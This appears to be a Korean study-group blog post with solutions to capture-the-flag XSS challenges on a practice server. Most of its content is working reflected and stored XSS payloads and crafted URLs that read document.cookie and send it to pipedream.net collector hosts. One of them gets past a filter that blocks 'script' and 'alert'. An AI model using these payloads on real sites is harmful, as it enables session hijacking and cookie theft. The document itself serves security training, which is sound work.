---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[CTF] CTF 문제 풀이: XSS"
excerpt: "모의해킹 취업반 스터디 7기 9주차"

date: 2024-12-18
last_modified_at: 

tags: [TIL, WEB]
---

# XSS 1
## index.php

## login.html

## signup.html

### signup.php
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-1.png?raw=true)

## qna_board.php

## qna.php
### qna_create.php

## notice_list.php
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-2.gif?raw=true)
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-3.gif?raw=true)
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-4.gif?raw=true)

## notice_write.php
### notice_write_process.php

## mypage.php
### mypage_update.php

# xss2
## notice_list.php의 search 부분 -> reflected xss
```js
');
let c = document.cookie;
console.log(c);
let i = new Image();
console.log(i);
i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie=" + c;
let tmp=('
```

link: <http://ctf.segfaulthub.com:4343/xss_2/notice_list.php?option_val=username&board_result=');let+c=document.cookie;console.log(c);let+i=new+Image();console.log(i);i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;let+tmp=('&board_search=%F0%9F%94%8D&date_from=&date_to=>

# xss3
notice_list.php의 search 부분은 html entity로 치환
## mypage -> reflected xss

```html
<img src=. onerror='
let c=document.cookie;
let i=new Image();
i.src="https://eot2jevtyijbm2l.m.pipedream.net/?cookie="+c;'>
```
+ -> %2B
<img+src=.+onerror='let+c=document.cookit;let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;'>
# xss4
## notice_list -> stored xss
script, alert <- black list filtering
`<img src=. onerror="prompt(1)">`

```html
<img src=. onerror="let cookie = document.cookie;let img = new Image();img.src = 'https://eot2jevtyijbm2l.m.pipedream.net/?cookie=' + cookie;">
```

# xss5

# xss6
# login.php
id=
```js
');
let c=document.cookie;
let i=new Image();
i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="+c;
console.log('
```
pw=1
id=');let+c="test";let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;console.log('&pw=1

link: http://ctf.segfaulthub.com:4343/xss_7/login.php?id=');let+c="test";let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;alert(c);alert(i);console.log('&pw=1
link: http://ctf.segfaulthub.com:4343/xss_7/login.php?id=');let+c=document.cookie;let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;console.log(c);console.log('&pw=